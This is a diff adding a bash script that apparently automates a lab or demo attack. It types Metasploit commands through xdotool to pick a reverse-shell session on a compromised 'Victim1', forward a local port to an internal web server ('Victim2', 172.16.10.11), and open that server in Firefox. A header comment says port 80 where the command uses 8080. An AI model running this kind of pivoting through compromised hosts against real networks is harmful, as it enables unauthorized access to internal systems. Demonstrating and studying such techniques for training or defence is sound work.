@@ -1,0 +1,38 @@
+#!/bin/bash
+###############################
+# Script to access internal web server via Reverse Shell (Victim1 session)
+# The commands using metasploit are
+# sessions -l                                                <--- list all existing Reverse Shell sessions
+# sessions -i 1                                              <--- use session1 (Victim1)
+# portfwd add -l 10080 -p 8080 -r 172.16.10.11                 <--- Create on attacker a port forwarded on its port 10080 that will be sent 
+#                                                                 to server 172.16.10.11:80 (Victim2) via Victim1 Reverse Shell
+# portfwd list                                               <--- show port forward list
+# on Attacker run "http://127.0.0.1:10080"                   <--- Access Victim2 web server via Victim1 
+###############################
+
+echo "Wait for the end of Victim2 (internal web server) access via Victim1..."
+
+xdotool windowactivate `cat /tmp/attack_window`
+xdotool type --window `cat /tmp/attack_window` --delay 100 "sessions -l"; xdotool key --window `cat /tmp/attack_window` Return
+sleep 1
+xdotool type --window `cat /tmp/attack_window` --delay 100 "sessions -i 1"; xdotool key --window `cat /tmp/attack_window` Return
+sleep 1
+xdotool type --window `cat /tmp/attack_window` --delay 100 "portfwd add -l 10080 -p 8080 -r 172.16.10.11"; xdotool key --window `cat /tmp/attack_window` Return
+sleep 1
+xdotool type --window `cat /tmp/attack_window` --delay 100 "portfwd list"; xdotool key --window `cat /tmp/attack_window` Return
+xdotool type --window `cat /tmp/attack_window` --delay 100 "background"; xdotool key --window `cat /tmp/attack_window` Return
+sleep 2
+
+xdotool windowactivate `cat /tmp/script_window`
+echo ""
+echo "Now 127.0.0.1:10080 forwards to Victim2=172.16.10.11:8080 through Victim1=VDI"
+echo ""
+sleep 1
+echo "Launch your browser to http://127.0.0.1:10080/ to check what application it is"
+echo "(done automatically by script)"
+sleep 3
+echo ""
+firefox http://127.0.0.1:10080/ &
+sleep 10
+echo ""
+echo "End of Victim2 (internal web server) access via Victim1..."
